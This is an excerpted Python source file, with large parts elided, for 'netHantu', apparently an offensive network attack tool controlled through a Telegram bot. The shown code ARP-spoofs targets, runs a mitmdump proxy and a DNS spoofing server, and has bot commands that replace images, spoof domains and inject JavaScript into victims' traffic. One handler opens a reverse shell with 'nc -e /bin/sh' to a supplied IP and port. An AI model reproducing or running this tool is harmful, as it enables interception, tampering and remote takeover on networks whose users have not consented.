...
def arpSpoof(target):
    ...
    os.system("sudo screen -S netHantu-arp-" + target[0] + "-0 -m -d arpspoof -t " + target[0] + " " + gw_ip + " -i " + interface)
    os.system("sudo screen -S netHantu-arp-" + target[0] + "-1 -m -d arpspoof -t " + gw_ip + " " + target[0] + " -i " + interface)
    ...
    while True:
        if attackManager("isrunning", ID=ID) == True:
            try:
                ...
                DBconn.commit()
                DBcursor.execute("SELECT * FROM netHantu_mitm")
                ...
                for item in data:
                    if item[6] == "1":
                        ...
                        if len(textline + temp_textline) > 3000:
                            break
                        textline += temp_textline
                    DBcursor.execute("DELETE FROM netHantu_mitm WHERE id=?", [str(item[0])])
                    DBconn.commit()
...
def attackManager(action, attack_type=False, target=False, ID=False):
    ...
    def getNewID():
        DBcursor.execute("SELECT attackid FROM netHantu_attacks ORDER BY id DESC LIMIT 1")
    ...
    if action == "new":
        ID = getNewID()
        DBcursor.execute("INSERT INTO netHantu_attacks(attackid, attack_type, target) VALUES (?, ?, ?)", [str(ID), attack_type, target])
        DBconn.commit()
        return ID

    elif action == "del":
        DBcursor.execute("DELETE FROM netHantu_attacks WHERE attackid=?", [str(ID)])
        DBconn.commit()
        ...
        DBcursor.execute("SELECT attackid FROM netHantu_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
        ...
        DBcursor.execute("SELECT attackid FROM netHantu_attacks WHERE target=? ORDER BY id DESC LIMIT 1", [target])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
        ...
        DBcursor.execute("SELECT attack_type FROM netHantu_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
        ...
        DBcursor.execute("SELECT target FROM netHantu_attacks WHERE attackid=? ORDER BY id DESC LIMIT 1", [str(ID)])
        data = DBcursor.fetchone()
        if data == None:
            return False
        else:
        ...
        DBcursor.execute("SELECT attackid FROM netHantu_attacks WHERE target=?", [target])
        data = DBcursor.fetchall()
        if data == None:
            return []
        else:
        ...
        DBcursor.execute("SELECT attackid, attack_type, target FROM netHantu_attacks")
        data = DBcursor.fetchall()
        if data == None:
            return []
        else:
...
def stopAttack(ID):
    ...
    if not attackManager("isattacked", target=target):
        ...
        os.system("sudo screen -S netHantu-arp-" + target + "-0 -X stuff '^C\n'")
        os.system("sudo screen -S netHantu-arp-" + target + "-1 -X stuff '^C\n'")
    ...
    if atype == "kill":
        ...
        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("DELETE FROM netHantu_img WHERE attackid=?", [str(ID)])
        DBconn.commit()
        DBconn.close()
        ...
        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("DELETE FROM netHantu_js WHERE attackid=?", [str(ID)])
        DBconn.commit()
        DBconn.close()
        ...
        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("CREATE TABLE IF NOT EXISTS netHantu_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
        DBconn.commit()
        DBconn.close()

        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("DELETE FROM netHantu_dns WHERE attackid=?", [str(ID)])
        DBconn.commit()
        DBconn.close()
...
def stopping():
    ...
    os.system("sudo screen -S netHantu-mitm -X stuff '^C\n'")
    os.system("sudo screen -S netHantu-dns -X stuff '^C\n'")
    iptables("flush")
    ...
    if not attacks == []:
        time.sleep(5)
    os.system("sudo rm -r " + script_path + "netHantu.db > /dev/null 2>&1")
    print("[+] netHantu stopped")
    raise SystemExit
...
def msg_start(bot, update):
    ...
    try:
        bot.send_message(chat_id=update.message.chat_id, text="Welcome to netHantu! 👻")
    except:
        print("[!!!] " + str(traceback.format_exc()))
...
def msg_img(bot, update):
    ...
    try:
        ...
        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("SELECT * FROM netHantu_img")
        data = DBcursor.fetchall()
        if not data == []:
            for attack in data:
                if attack[2] == "false":
                    ...
                    DBcursor.execute("UPDATE netHantu_img SET img=?, attackid=?  WHERE target=?", [img64, str(ID), attack[1]])
                    DBconn.commit()
...
def msg_replaceimg(bot, update, args):
    ...
    try:
        ...
        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("INSERT INTO netHantu_img VALUES (?, ?, ?, ?)", ["false", target, "false", target_ip])
        DBconn.commit()
        DBconn.close()
...
def msg_spoofdns(bot, update, args):
    ...
    try:
        ...
        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("INSERT INTO netHantu_dns VALUES (?, ?, ?, ?)", [str(ID), target[0], domain, fakeip])
        DBconn.commit()
        DBconn.close()
...
def msg_injectjs(bot, update, args):
    ...
    try:
        ...
        DBconn = sqlite3.connect(script_path + "netHantu.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("INSERT INTO netHantu_js VALUES (?, ?, ?)", [str(ID), target[0], jsurl64])
        DBconn.commit()
        DBconn.close()
...
def msg_restart(bot, update):
    ...
    try:
        bot.send_message(chat_id=update.message.chat_id, text="✅ Restarting netHantu...")
        restarting()
    except:
        print("[!!!] " + str(traceback.format_exc()))
        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
...
def msg_reversesh(bot, update, args):
    ...
    try:
        ...
        os.system("sudo screen -S netHantu-reversesh -X stuff '^C\n' > /dev/null 2>&1")
        os.system("sudo screen -S netHantu-reversesh -m -d nc -e /bin/sh " + target_ip + " " + str(port))
    except:
        print("[!!!] " + str(traceback.format_exc()))
        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
...
def main():
    ...
    bot.send_message(chat_id=admin_chatid, text="netHantu started! 👻")
...
if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Please run netHantu as root!")
        raise SystemExit
    ...
    header = """
                ...
                """
    try:
        print(header + """          v1.0 """ + WHITE + """by Ghostbuster Team (@akukisopo)    """ + "\n" + END)
    except:
        print(header + """                         v1.0 """ + WHITE + """by @akukisopo    """ + "\n" + END)

    os.system("rm -r " + script_path + "netHantu.db > /dev/null 2>&1")

    os.system("sudo screen -S netHantu-mitm -m -d mitmdump -T --host -s " + script_path + "proxyScript.py")
    os.system("sudo screen -S netHantu-dns -m -d python3 " + script_path + "dnsServer.py")
    refreshNetworkInfo()
    iptables("setup")
